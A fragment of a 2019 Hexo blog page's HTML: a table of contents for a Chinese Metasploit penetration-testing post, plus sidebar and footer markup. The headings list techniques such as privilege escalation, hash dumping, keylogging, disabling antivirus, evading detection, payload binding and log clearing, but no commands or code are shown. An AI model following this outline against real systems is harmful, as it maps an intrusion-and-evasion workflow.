+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#技巧汇总"><span class="nav-number">1.</span> <span class="nav-text">技巧汇总</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#内网代理"><span class="nav-number">1.1.</span> <span class="nav-text">内网代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限提升"><span class="nav-number">1.2.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#令牌窃取与模拟"><span class="nav-number">1.3.</span> <span class="nav-text">令牌窃取与模拟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BypassUAC"><span class="nav-number">1.4.</span> <span class="nav-text">BypassUAC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HashDump"><span class="nav-number">1.5.</span> <span class="nav-text">HashDump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限维持"><span class="nav-number">1.6.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞扫描"><span class="nav-number">1.7.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#清楚痕迹"><span class="nav-number">1.8.</span> <span class="nav-text">清楚痕迹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取系统账号密码"><span class="nav-number">1.9.</span> <span class="nav-text">读取系统账号密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#键盘记录"><span class="nav-number">1.10.</span> <span class="nav-text">键盘记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进程权限迁移"><span class="nav-number">1.11.</span> <span class="nav-text">进程权限迁移</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关闭杀毒软件"><span class="nav-number">1.12.</span> <span class="nav-text">关闭杀毒软件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取系统流量"><span class="nav-number">1.13.</span> <span class="nav-text">获取系统流量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取目标网络共享"><span class="nav-number">1.14.</span> <span class="nav-text">获取目标网络共享</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VNC远程界面控制"><span class="nav-number">1.15.</span> <span class="nav-text">VNC远程界面控制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-API编程-Hello-World弹窗"><span class="nav-number">1.16.</span> <span class="nav-text">Windows API编程 , Hello World弹窗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编码绕过杀软"><span class="nav-number">1.17.</span> <span class="nav-text">编码绕过杀软</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自定义可执行程序模板"><span class="nav-number">1.18.</span> <span class="nav-text">自定义可执行程序模板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#暗度陈仓—猥琐执行payload-绑定到可执行文件"><span class="nav-number">1.19.</span> <span class="nav-text">暗度陈仓—猥琐执行payload (绑定到可执行文件)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MetaSploit-创建工作空间"><span class="nav-number">1.20.</span> <span class="nav-text">MetaSploit 创建工作空间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用-Hosts-中的IP定向渗透"><span class="nav-number">1.21.</span> <span class="nav-text">使用 Hosts 中的IP定向渗透</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#常用渗透手段"><span class="nav-number">2.</span> <span class="nav-text">常用渗透手段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#扫描匿名FTP"><span class="nav-number">2.1.</span> <span class="nav-text">扫描匿名FTP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#与nessus-结合扫描"><span class="nav-number">2.2.</span> <span class="nav-text">与nessus 结合扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB弱口令扫描"><span class="nav-number">2.3.</span> <span class="nav-text">SMB弱口令扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VNC空口令扫描"><span class="nav-number">2.4.</span> <span class="nav-text">VNC空口令扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Open-X11空口令"><span class="nav-number">2.5.</span> <span class="nav-text">Open X11空口令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Msf自动化测试-一行命令执行"><span class="nav-number">2.6.</span> <span class="nav-text">Msf自动化测试(一行命令执行)</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="魏超"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">魏超</p>
+  <div class="site-description" itemprop="description">胡歌</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">魏超</span>
+</div>
+  <!--<div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
+  </div>
+--!>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/clicklove.js"></script>
